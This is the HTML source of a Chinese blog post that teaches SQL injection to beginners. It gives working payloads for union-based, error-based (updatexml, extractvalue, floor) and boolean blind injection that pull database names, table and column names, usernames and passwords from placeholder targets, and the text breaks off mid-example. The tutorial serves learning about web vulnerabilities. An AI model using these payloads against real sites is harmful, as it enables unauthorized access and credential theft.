@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="fonts.loli.net/css?family=EB Garamond:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.zhubokai.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="什么是SQL注入 服务器端没有严格校验客户端发送的数据，导致服务器端的SQL指令被成功的恶意修改并执行的行为被称为SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入入门教程">
+<meta property="og:url" content="https://www.zhubokai.com/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html">
+<meta property="og:site_name" content="Demonsのblog">
+<meta property="og:description" content="什么是SQL注入 服务器端没有严格校验客户端发送的数据，导致服务器端的SQL指令被成功的恶意修改并执行的行为被称为SQL注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/2.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/1.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/3.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/4.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/5.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/6.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/7.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/8.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/9.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/10.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/11.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/12.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/13.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/14.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/15.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/16.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/17.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/18.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/19.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/20.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/21.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/22.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/23.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/24.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/25.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/26.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/27.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/28.png">
+<meta property="og:image" content="https://www.zhubokai.com/images/sql/29.png">
+<meta property="article:published_time" content="2020-09-23T02:02:11.000Z">
+<meta property="article:modified_time" content="2020-09-23T13:05:15.831Z">
+<meta property="article:author" content="Demons">
+<meta property="article:tag" content="SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.zhubokai.com/images/sql/2.png">
+
+<link rel="canonical" href="https://www.zhubokai.com/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入入门教程 | Demonsのblog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Demonsのblog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Demonsのblog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">祸莫大于不知足;咎莫大于欲得。故知足之足，常足矣</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-top">
+
+    <a href="/top/" rel="section"><i class="fa fa-signal fa-fw"></i>排行榜</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.zhubokai.com/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Demons">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demonsのblog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入入门教程
+        </h1>
+
+        <div class="post-meta">
+		
+		
+  <i class="fa fa-thumb-tack"></i>
+  <font color="7D26CD">置顶</font>
+  <span class="post-meta-divider">|</span>
+
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-23 10:02:11 / 修改时间：21:05:15" itemprop="dateCreated datePublished" datetime="2020-09-23T10:02:11+08:00">2020-09-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL/" itemprop="url" rel="index"><span itemprop="name">SQL</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html" class="post-meta-item leancloud_visitors" data-flag-title="SQL注入入门教程" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count">℃</span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.9k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><ul>
+<li>服务器端没有严格校验客户端发送的数据，导致服务器端的SQL指令被成功的恶意修改并执行的行为被称为SQL注入</li>
+</ul>
+<a id="more"></a>
+
+
+
+<ul>
+<li>本节不涉及高级的技术，如避开过滤，绕开防御，SQL注入防御技巧等，仅供初学者参考</li>
+</ul>
+<h1 id="SQL注入攻击流程"><a href="#SQL注入攻击流程" class="headerlink" title="SQL注入攻击流程"></a>SQL注入攻击流程</h1><h2 id="判断是否存在注入点-后端是否严格校验"><a href="#判断是否存在注入点-后端是否严格校验" class="headerlink" title="判断是否存在注入点(后端是否严格校验)"></a>判断是否存在注入点(后端是否严格校验)</h2><ul>
+<li>客户端提供不同的数据，测试服务器是否返回不同的结果</li>
+<li>提供畸形的输入，根据返回的结果确定注入类型<ul>
+<li>搭配 and 1 %23 等简单的指令查看用户的输入是否被作为 SQL 指令的一部分执行</li>
+<li>如果数据和错误都被显示，可以考虑普通联合查询方式注入</li>
+<li>如果数据不被显示，但是错误信息被显示，可以考虑报错注入 + 双注入</li>
+<li>如果能够知道是否成功，可以考虑布尔盲注（比较）</li>
+<li>如果什么都没有提示，可以考虑时间盲注（sleep + if）</li>
+</ul>
+</li>
+<li>构建合理(闭合)的指令查询信息，获取想要得到的数据</li>
+</ul>
+<h2 id="通过SQL指令获取到想要的数据"><a href="#通过SQL指令获取到想要的数据" class="headerlink" title="通过SQL指令获取到想要的数据"></a>通过SQL指令获取到想要的数据</h2><ul>
+<li><p>查询到字段的数量</p>
+<ul>
+<li><p>联合查询：允许同时执行多条语句并输出，要求查询的字段数相同</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......;     <span class="comment">-- 直到没有报错</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>排序语句，对输出结果进行排序</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY index;        <span class="comment">-- 直到没有报错</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>获取数据库的基本信息</p>
+<ul>
+<li>version()：版本信息，用于查找漏洞</li>
+<li>database()：当前使用数据库名称，用于进一步获取后面的数据</li>
+<li>user()：保存了数据库的地址以及当前登录的用户名</li>
+</ul>
+</li>
+<li><p>获取到的数据库的表名以及字段名(information_schema)</p>
+<ul>
+<li><p>TABLES：保存了所有的表和数据库之间的信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 获取所有的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, TABLE_SCHEMA <span class="keyword">FROM</span> <span class="keyword">TABLES</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取指定的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, TABLE_SCHEMA <span class="keyword">FROM</span> <span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 通过一条输出获取指定数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(TABLE_NAME),<span class="keyword">group_concat</span>(TABLE_SCHEMA) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 当前的数据库有哪些表</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>COLUMNS：所有的字段和表直接的信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 获取所有表的所有字段</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> <span class="keyword">COLUMNS</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 在获取所有表名的基础上，查询关注的表</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> <span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 指定的表中有哪些字段</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME=<span class="string">&#x27;表名&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过前面查询到的关键表以及字段的名字进行下一步查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>), <span class="keyword">group_concat</span>(<span class="keyword">password</span>), <span class="keyword">group_concat</span>(username) <span class="keyword">FROM</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><ul>
+<li>本节不涉及</li>
+</ul>
+<h1 id="SQL注入-常见注入类型以及注入方法"><a href="#SQL注入-常见注入类型以及注入方法" class="headerlink" title="SQL注入-常见注入类型以及注入方法"></a>SQL注入-常见注入类型以及注入方法</h1><ul>
+<li>对于初学者来说，前边的看不懂没有关系，接下来便会正式讲解这些指令</li>
+</ul>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><ul>
+<li><p><strong><em>数字型</em></strong></p>
+<ul>
+<li><p>id=$id</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://test.php?id=1 and 1=1    返回成功</span><br><span class="line">http://test.php?id=1 and 1=2    返回失败</span><br><span class="line"></span><br><span class="line">为什么会这样呢？首先，and 的左边返回的是成功的，我们是在这个id存在的情况下加入的注入语句，而在 and 的右边，1=1也是成立的，所以语句返回的还是成功，但是由于1=2不成立，and 语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>字符型</em></strong></p>
+<ul>
+<li><p>id=’$id’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;1 返回成功</span><br><span class="line">http://test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;2 返回失败</span><br><span class="line"></span><br><span class="line">关键是构造闭合，这里语句就变成了......WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>搜索型</em></strong></p>
+<ul>
+<li><p>text LIKE ‘%{GET[ ‘search’ ]}%’ “</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://test.php?text=text%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">http://test.php?text=text%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="SQL注入时注意的MySql数据库注释"><a href="#SQL注入时注意的MySql数据库注释" class="headerlink" title="SQL注入时注意的MySql数据库注释"></a>SQL注入时注意的<code>MySql</code>数据库注释</h2><ul>
+<li><code>MySql</code>数据库支出三种注释<ul>
+<li>#：注释当前字符到末尾</li>
+<li>–：注释当前字符到末尾，–后面至少跟一个空格</li>
+<li>/**/：多行注释</li>
+</ul>
+</li>
+<li>实际进行注入过程中，建议使用 %23 进行注释</li>
+</ul>
+<h2 id="注入方式-get-amp-post-的区别"><a href="#注入方式-get-amp-post-的区别" class="headerlink" title="注入方式 get&amp;post 的区别"></a>注入方式 get&amp;post 的区别</h2><ul>
+<li>Get 方式用 <code>url</code> 提交注入数据</li>
+<li>Post 方式是使用抓包工具修改 post 数据部分提交注入</li>
+</ul>
+<h2 id="基于函数报错信息"><a href="#基于函数报错信息" class="headerlink" title="基于函数报错信息"></a>基于函数报错信息</h2><ul>
+<li><p>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端</p>
+</li>
+<li><p><code>Updatexml(XML_document, XPath_string, new_value)</code>：<code>mysql</code> 对 xml 文件数据进行查询和修改的 <code>xpath</code> 函数</p>
+<ul>
+<li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称</li>
+<li>第二个参数：XPath_string（XPath格式的字符串）</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">concat：将两个字符串连接为一个字符串</span><br><span class="line">limit：检索查询返回的行的一部分</span><br><span class="line">0x7e：是一个波浪符，&#x27;~&#x27;，防止被转义</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,version()),0)<span class="comment"># 获取版本</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,database()),0)<span class="comment"># 获取数据库名</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,user()),0)<span class="comment"># 获取用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名（一次获取一个）</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;数据库名&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 获取表的列名 (一次获取一个)</span></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>数据库名<span class="string">&#x27; and TABLE_NAME=&#x27;</span>表名<span class="string">&#x27; limit 0,1)),0)# </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 4. 获取表的内容 （一次获取一个）</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment"># </span></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# </span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">right</span>(<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">10</span>),<span class="number">0</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>extractvalue()</code>：<code>mysql</code> 对于 xml 文档数据进行查询的 <code>xpath</code> 函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; and extractvalue(0,concat(0x7e,version()),0)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>floor()</code>：<code>mysql</code> 中用来取整的函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; and (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
+<li><p>什么是盲注</p>
+<ul>
+<li>在有些情况下，后台使用了错误信息屏蔽方法，屏蔽了报错，此时无法再根据报错信息来进行注入的判断，这种情况下的注入，称为“盲注”</li>
+</ul>
+</li>
+<li><p>盲注分为两种</p>
+<ul>
+<li><p>基于布尔</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">substr     查找字符串中的子串</span><br><span class="line">ascii    将字符转为ascii码</span><br><span class="line">right    获取字符串的右边子串</span><br><span class="line">left    获取字符串的左边子串</span><br><span class="line">length    求长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())=<span class="number">2</span>    求数据库名长度并判断是否等于<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span>    查看数据名的第一个字符并判断是否是p</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 判断是否有盲注</span></span><br><span class="line">x<span class="string">&#x27; and 1=1#    正常查询</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span><span class="comment">#    返回的结果不一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line"><span class="comment">-- 1.1 获取数据库名的长度</span></span><br><span class="line">x<span class="string">&#x27; and length(database())=2#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">1</span><span class="comment">#</span></span><br><span class="line">x<span class="string">&#x27; and length(database())&lt;3#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 1.2 获取数据库名</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span><span class="comment">#</span></span><br><span class="line">x<span class="string">&#x27; and ascii(substr(database(),1,1))=112#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名</span></span><br><span class="line"><span class="comment">-- 2.1 获取第一个表</span></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.2 获取第一个表的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and substr((select TABLE_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 